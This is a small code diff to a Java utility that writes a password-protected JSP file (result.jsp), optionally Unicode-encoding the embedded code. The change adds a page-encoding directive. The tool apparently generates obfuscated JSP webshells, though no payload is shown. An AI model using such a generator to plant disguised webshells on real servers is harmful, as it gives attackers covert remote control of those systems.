@@ -6,6 +6,7 @@ public class WriteUtil {
     public static void write(MethodDeclaration method, MethodDeclaration decMethod,
                              String password, boolean useUnicode) {
         try {
+            String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
             String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
             String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
             String decCode = decMethod.toString();
@@ -17,10 +18,10 @@ public class WriteUtil {
                 if (useUnicode) {
                     newCode = UnicodeUtil.encodeString(newCode);
                     newDecCode = UnicodeUtil.encodeString(newDecCode);
-                    String output = passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
+                    String output = prefix + passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                     FileUtil.writeFile("result.jsp", output);
                 } else {
-                    String output = passwordCode + "<%!" + decCode + "%><%" + source + " %>";
+                    String output = prefix + passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                     FileUtil.writeFile("result.jsp", output);
                 }
             }
